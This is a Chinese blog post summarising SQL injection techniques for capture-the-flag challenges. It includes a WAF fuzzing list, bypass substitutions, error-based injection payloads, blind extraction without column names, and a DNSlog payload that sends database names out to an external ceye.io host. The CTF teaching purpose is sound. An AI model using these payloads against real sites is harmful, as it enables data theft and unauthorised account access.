<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#6c599f">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/./images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/./images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/./images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/./images/safari-pinned-tab-next.svg" color="#6c599f">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=EB Garamond, Noto Serif SC:300,300italic,400,400italic,700,700italic|Long Cang:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"localhost","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="前言非常不想写这篇博客，因为ctf中的sql注入技巧太乱了，不知道怎么排版怎么分块把他表述清楚，然后又能像一个笔记一样时时供我查阅。所以直到我打现在这几个字的时候我都在想咋把我那嘈杂的笔记整理出这篇文章。但是整理肯定还是要整理的，毕竟自己也要看。">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF中的sql注入总结">
<meta property="og:url" content="http://localhost:4000/posts/CTF%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
<meta property="og:site_name" content="匆匆那年">
<meta property="og:description" content="前言非常不想写这篇博客，因为ctf中的sql注入技巧太乱了，不知道怎么排版怎么分块把他表述清楚，然后又能像一个笔记一样时时供我查阅。所以直到我打现在这几个字的时候我都在想咋把我那嘈杂的笔记整理出这篇文章。但是整理肯定还是要整理的，毕竟自己也要看。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2018-11-01T14:00:57.000Z">
<meta property="article:modified_time" content="2022-03-23T07:15:03.620Z">
<meta property="article:author" content="Geez">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="sqli">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://localhost:4000/posts/CTF%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CTF中的sql注入总结 | 匆匆那年</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">匆匆那年</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">钟声敲在你我耳边</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-fas fa-home"></i>首页</a>

  </li>
        
            
  <li class="menu-item menu-item-overview">

    <a href="/overview/" rel="section"><i class="fa fa-fw fa-fas fa-archive"></i>总览</a>

  </li>


      
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-fas fa-location-arrow"></i>关于</a>

  </li>
        <li class="menu-item menu-item-friends">

    <a href="/friends/" rel="section"><i class="fa fa-fw fa-fas fa-heart"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://localhost:4000/posts/CTF%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Geez">
      <meta itemprop="description" content="黑客,诗人,养龟仔">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="匆匆那年">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CTF中的sql注入总结
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发布：</span>

              <time title="创建时间：2018-11-01 22:00:57" itemprop="dateCreated datePublished" datetime="2018-11-01T22:00:57+08:00">2018-11-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类：</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/overview/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>8 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>非常不想写这篇博客，因为ctf中的sql注入技巧太乱了，不知道怎么排版怎么分块把他表述清楚，然后又能像一个笔记一样时时供我查阅。所以直到我打现在这几个字的时候我都在想咋把我那嘈杂的笔记整理出这篇文章。但是整理肯定还是要整理的，毕竟自己也要看。<span id="more"></span></p>
<h4 id="CTF-sql注入三原则"><a href="#CTF-sql注入三原则" class="headerlink" title="CTF sql注入三原则"></a>CTF sql注入三原则</h4><p>1.细致的猜测注入点的语句大概是什么样子。<br>2.判断是有回显的注入还是盲注，有回显的注入当盲注做是自己为难自己。<br>3.盲注优先考虑布尔盲注，然后才是时间盲注。</p>
<h4 id="sql注入流程"><a href="#sql注入流程" class="headerlink" title="sql注入流程"></a>sql注入流程</h4><p>我们来捋一捋这个sql注入的一般流程，首先有一个注入点，然后肯定有一个waf，waf过滤了一些关键字，我们做的就是绕过关键字的过滤，构造能执行的sql语句去获取数据库的flag。捋完流程，我们就知道流程中每一步应该怎么做、应该做什么。在开始之前还是要提出几个注意点：<br>1.注意区分数据的大小写，因为mysql默认不区分数据的大小写比较<br>解决方法：ascii编码比较、WHERE后加BINARY、regexp<br>2.站在出题者角度思考问题。</p>
<h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h5><p>自动化fuzz或者手工fuzz，如果不ban ip 、网络稳定，那么自动化fuzz还是很好用的。因为绝大多数都是关键字过滤，fuzz的准确度很高。脚本就是直接py请求查看响应是否有waf响应的关键字。<br>fuzz字典（不全，自行补充）</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">or</span><br><span class="line">|</span><br><span class="line">%</span><br><span class="line">and</span><br><span class="line">%26</span><br><span class="line">&amp;</span><br><span class="line">union</span><br><span class="line">select</span><br><span class="line">information</span><br><span class="line">information_schema</span><br><span class="line">name</span><br><span class="line">table_name</span><br><span class="line">column_name</span><br><span class="line">if</span><br><span class="line">,</span><br><span class="line">%20</span><br><span class="line"> //空格</span><br><span class="line">sleep</span><br><span class="line">^</span><br><span class="line">in</span><br><span class="line">like</span><br><span class="line">between</span><br><span class="line">*</span><br><span class="line">#</span><br><span class="line">--</span><br><span class="line">--+</span><br><span class="line">-</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">@</span><br><span class="line">user</span><br><span class="line">password</span><br><span class="line">passwd</span><br><span class="line">username</span><br></pre></td></tr></table></figure>

<h5 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h5><p>绕过waf说白了就是同功能函数的替换，比如 substr &#x3D;&#x3D; mid，下面我们就搞个这样的表方便大家查询(他们在一定成都上都有替代作用)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">//比较判断</span><br><span class="line">&gt;  &lt;  &lt;&gt;  = and or || &amp;&amp; %26%26 like  between  regexp  in  strcmp  locate(s1,s)  position(s1 in s)  instr(s,s1)  greatest()  find_in_set() </span><br><span class="line">//ps：select &quot;123&quot; in (&quot;123&quot;); =&gt; 1 select &quot;123&quot; in (&quot;12&quot;)</span><br><span class="line"></span><br><span class="line">//ascii</span><br><span class="line">hex()</span><br><span class="line">bin()</span><br><span class="line">ord()</span><br><span class="line"></span><br><span class="line">//切割字符串</span><br><span class="line">left()</span><br><span class="line">right()</span><br><span class="line">mid()</span><br><span class="line">substr()</span><br><span class="line">substring()</span><br><span class="line">lpad()</span><br><span class="line">rpad()</span><br><span class="line">//ps:LPAD(&#x27;abcdef&#x27;,4,&#x27;?&#x27;); 和RPAD(&#x27;abcdef&#x27;,4,&#x27;?&#x27;);结果都为abcd</span><br><span class="line"></span><br><span class="line">//空格</span><br><span class="line">%20 + /**/ /*乱字符*/ </span><br><span class="line">1e1 1.1 () </span><br><span class="line">//这里的括号绕过是有限制的不是直接括号当空格用，还是举个例子把：</span><br><span class="line">select(id)from(user);  括号内不能是*。</span><br><span class="line">PS:浮点数科学计数法后面的字符串也不需要空格 比如：select 1.1and(1)</span><br><span class="line"></span><br><span class="line">//过滤逗号</span><br><span class="line">imit 0,1 =&gt; limit 1 offset 0;</span><br><span class="line">mid(str,5,1) =&gt;mid(&#x27;str&#x27;from 5 for 1) =&gt;substr(&#x27;str&#x27; from for 1)</span><br><span class="line">union select 1,2,3 =&gt; union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">mid(&#x27;123&#x27; from -1); =&gt;3 //适用于for被过滤</span><br><span class="line">mid(&#x27;123&#x27; from -2); =&gt;23 //适用于for被过滤</span><br><span class="line">substring(&#x27;abc&#x27; from 1) = abc  </span><br><span class="line">substring(&#x27;abc&#x27; from 2) = bc</span><br><span class="line">这样我们通过ord ascii 函数即可进行判断，因为这两个函数返回第一个字符的ascii码</span><br><span class="line"></span><br><span class="line">//连接字符串的函数</span><br><span class="line">concat(str1,str2) 将字符串首尾相连</span><br><span class="line">concat_ws(separator,str1,str2) 将字符串用指定连接符连接</span><br><span class="line">group_concat()</span><br><span class="line"></span><br><span class="line">//注释</span><br><span class="line">#</span><br><span class="line">/**/</span><br><span class="line">--</span><br><span class="line">;%00 //mysql是C写的也存在00截断</span><br><span class="line"></span><br><span class="line">//延时函数</span><br><span class="line">sleep()</span><br><span class="line">benchmark(1000000,sha(1))</span><br><span class="line"></span><br><span class="line">//hex编码的用处</span><br><span class="line">所有用户输入的会拼接到=号后面的数据都可用hex编码比如：</span><br><span class="line">select * from user where username=0x7cb6e453</span><br><span class="line">这样的好处就是，比如不需要单引号 绕过关键字过滤等。</span><br><span class="line"></span><br><span class="line">//绕过一体化过滤 比如 过滤user()</span><br><span class="line">select user/**/()  //这样一样能执行，不过这样过滤的waf倒是很少见。</span><br><span class="line"></span><br><span class="line">//报错注入</span><br><span class="line">1.floor()</span><br><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">2.updatexml() //5.1.5</span><br><span class="line">and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">3.extractvalue() //5.1.5</span><br><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br><span class="line"></span><br><span class="line">4.exp() //5.5.5版本之后可以使用</span><br><span class="line">select host from user where user = &#x27;root&#x27; and Exp(~(select * from (select version())a));</span><br><span class="line"></span><br><span class="line">5.name_const //支持老版本</span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line"></span><br><span class="line">6.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</span><br><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br><span class="line">7.有时候报错注入是可以根据列名把表名爆出来 # 比如 1&#x27;||polygon(passwd)</span><br><span class="line"></span><br><span class="line">//宽字节注入就不说了，别人写太多了</span><br><span class="line">%df 逃离单引号的转义</span><br><span class="line"></span><br><span class="line">//or被过滤 或者 是 information不能使用的情况下</span><br><span class="line">一般考点可能是同表查询直接切割，比如 select * from flag where id=1 and mid(flag,1,1)=&#x27;f&#x27;</span><br><span class="line">还有可能考察5.6.x以上版本的新特性 -&gt; 在其自带的 mysql 库中，新增了 innodb_table_stats 和 innodb_index_stats 这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息</span><br><span class="line">其中 innodb_table_stats innodb_index_stats 等同于 information_schema.tables  当然要想深入理解还是下载一个5.6的数据库仔细看看</span><br><span class="line"></span><br><span class="line">//limit where 被过滤 </span><br><span class="line">可以利用group by having 来做限制条件！</span><br><span class="line">select uid,uname,passwd from admin group by passwd having uid=1;这样就能得到一行数据 并且有where作用，当然没有where和limit那么方便，更多操作还有待开放呢！</span><br><span class="line"></span><br><span class="line">//番外篇之我的经验</span><br><span class="line">越来越多的用 xor ^ regexp 这些作比较</span><br><span class="line">常用payload if(mid(sql)=&#x27;a&#x27;，1，0)</span><br><span class="line">善用 length() 这样就知道查询的未知字段是多少长度，写脚本也方便，也能直接猜测长度对应的字符可能是啥。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过上面的这些替换绕过waf,最终我们需要执行我们构造出来的语句来获取flag，一般是通过information_schema表，这个表相当于一个字典，保存了所有database的信息。</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">database() //获取当前数据库</span><br><span class="line">//查库</span><br><span class="line">select schema_name from information_Schema.schemata limit 1,1; </span><br><span class="line">//查表</span><br><span class="line">select table_name from information_Schema.tables where table_schema=database() limit 1,1</span><br><span class="line">查字段</span><br><span class="line">select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27; limit 0,1</span><br><span class="line">//</span><br></pre></td></tr></table></figure>

<h4 id="还有一些小众的技巧"><a href="#还有一些小众的技巧" class="headerlink" title="还有一些小众的技巧"></a>还有一些小众的技巧</h4><h5 id="无法获取列名如何取数据"><a href="#无法获取列名如何取数据" class="headerlink" title="无法获取列名如何取数据"></a>无法获取列名如何取数据</h5><p>1.有回显的order by进行数据猜测</p>
<table>
<thead>
<tr>
<th align="center">id</th>
<th align="center">username</th>
<th align="center">xxxxxx</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">admin</td>
<td align="center">flag{this_is_flag}</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">admin2</td>
<td align="center">1</td>
</tr>
</tbody></table>
<p>如上一个数据表flag，当我们通过information表获取到了表明和有多少列，但是死活不知道最后一列列名，那么怎么查？</p>
<p>如果是有回显的注入可以这样</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;fl&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>通过我们的联合查询的第三列来一步一步的比对出flag是什么字符串。举个例子：<br>比如我们的显示位是3那么：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;fl&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>这样如果我们的fl显示出来那么说明，它下面的字段应该是fl+字符，注意这里必须一位一位的去尝试。当然这个方法局限性很大，还很麻烦。</p>
<p>2.大多的时候是盲注，那就可以使用三表联合查询法：<br>网上的三表联合查询法总是讲不清楚，下面我们来分解下，你不用搞清楚什么是三表联合查询，你只需搞清楚每一步是什么意思即可。<br>首先我们构造一列：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1  </span><br></pre></td></tr></table></figure>
<p>上面的语句图形化查询结果如表</p>
<table>
<thead>
<tr>
<th align="center">c1</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
</tr>
</tbody></table>
<p>我们需要上面这样的列三个，因为目标表的列是三个（如果目标表查询的是五列，我们就需要构造五列）<br>然后我们把列组合在一起</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3</span><br></pre></td></tr></table></figure>
<p>结果就是下面这样</p>
<table>
<thead>
<tr>
<th align="center">c1</th>
<th align="center">c2</th>
<th align="center">c3</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">2</td>
<td align="center">3</td>
</tr>
</tbody></table>
<p>然后我们联合查询flag数据表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<table>
<thead>
<tr>
<th align="center">c1</th>
<th align="center">c2</th>
<th align="center">c3</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">2</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">admin</td>
<td align="center">flag{this_is_flag}</td>
</tr>
</tbody></table>
<p>现在我们把上面这个语句查询出来的表命名为t，然后我们查询这个表的c3字段,并取第二行的数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> t.c3 <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>)t limit <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>那么我们就成功得到flag了</p>
<table>
<thead>
<tr>
<th align="center">c3</th>
</tr>
</thead>
<tbody><tr>
<td align="center">flag{this_is_flag}</td>
</tr>
</tbody></table>
<p>当然盲注我们是不能看到的，所以还需要mid或者substr进行切割，最终我们写脚本来进行未知列名的数据读取：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid((<span class="keyword">select</span> t.c2 <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)t limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;f&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>从上面看我们并没有用第三列的列名但是成功把第三列的数据取了出来，这就是三联表查询。很简单吧。</p>
<h5 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h5><p>什么是参数污染？比如URL：<a target="_blank" rel="noopener" href="http://www.xxxx.com/search.php?id=110&amp;id=911">http://www.xxxx.com/search.php?id=110&amp;id=911</a><br>百度会理解成让百度搜索：110                  #选择了第一个参数,放弃了第二个参数。<br>雅虎会理解成让雅虎搜索：911　　           #选择了第二个参数,放弃了第一个参数。<br>谷歌会理解成让谷歌搜索：110 911           #两个参数同时选择。<br>主要的就是这三种情况了。<br>这主要是源于,不同的网站对处理参数的处理方式不同<br>倘若是第三种情况,也就是第一个参数取第二个参数也取。那么大家请看下面的URL<br><a target="_blank" rel="noopener" href="http://www.xishaonian.com/hello.php?id=select">http://www.xishaonian.com/hello.php?id=select</a> 1&amp;id&#x3D;2,3,3 from admin<br>该种情况还可用于Bypass WAF.</p>
<h5 id="DNSlogsql注入"><a href="#DNSlogsql注入" class="headerlink" title="DNSlogsql注入"></a>DNSlogsql注入</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\aa.&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;. vd85lw.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>相当于访问aa.ctf.yygta1.ceye.io DNS会记录下这个记录！注意网上的payload的concat后\会把单引号转义导致那个并不好用，就上面这个就挺好用的<br>推荐的平台：<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
<h5 id="mssql-mysql"><a href="#mssql-mysql" class="headerlink" title="mssql+mysql"></a>mssql+mysql</h5><p>mssql+mysql 可以在mssql中执行mysql的查询语句：<br>参考个链接吧 没细致研究,只是见过<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-tw/sql/t-sql/functions/openquery-transact-sql?view=sql-server-2017">https://docs.microsoft.com/zh-tw/sql/t-sql/functions/openquery-transact-sql?view=sql-server-2017</a></p>
<h5 id="MYSQL约束攻击："><a href="#MYSQL约束攻击：" class="headerlink" title="MYSQL约束攻击："></a>MYSQL约束攻击：</h5><p>对于长度有限制的字符串如果插入超过定义的长度会自动截断：<br>比如 user列名长度10 我们注册admin admin 肯定不行，这是管理员的账户<br>如果我们注册admin+++++++++++++++ admin12345<br>那么我们仍然可以用admin12345登陆admin账号原因是+会变成空格 这在前端和都端验证中都会通过<br>例题： bugku的一道CTF题,地址:<a target="_blank" rel="noopener" href="http://47.93.190.246:49163/">http://47.93.190.246:49163/</a></p>
